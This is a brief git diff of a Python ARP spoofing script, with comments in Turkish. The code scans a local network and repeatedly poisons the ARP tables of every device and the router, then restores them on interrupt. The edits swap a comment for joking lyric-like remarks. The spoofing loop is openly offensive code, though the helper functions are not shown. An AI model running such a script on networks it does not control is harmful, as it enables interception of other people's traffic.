@@ -57,8 +57,6 @@ if __name__ == "__main__":
 
     router_ip = input("🌐 Router IP (192.168.1.1): ")
     network_range = input("🔍 IP but Range (ör: 192.168.1.1/24): ")
-
-    # Ağı tarayarak tüm cihazları bul
     devices = scan_network(network_range)
     
     if len(devices) == 0:
@@ -87,10 +85,10 @@ if __name__ == "__main__":
                     spoof(router_ip, router_mac, device["ip"])
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\n[!] Stopping Arp...")
+        print("\n[!] Stopping Arp...") # bi kez olsun bizi calmadın adamım
         for device in devices:
             if device["ip"] != router_ip:
                 restore(device["ip"], device["mac"], router_ip, router_mac)
                 restore(router_ip, router_mac, device["ip"], device["mac"])
 
-        print("[+] Normalized Network.")
+        print("[+] Normalized Network.") # baba cal bizi cal bizi de bi cal orman kanunları dedik yada zerde çal
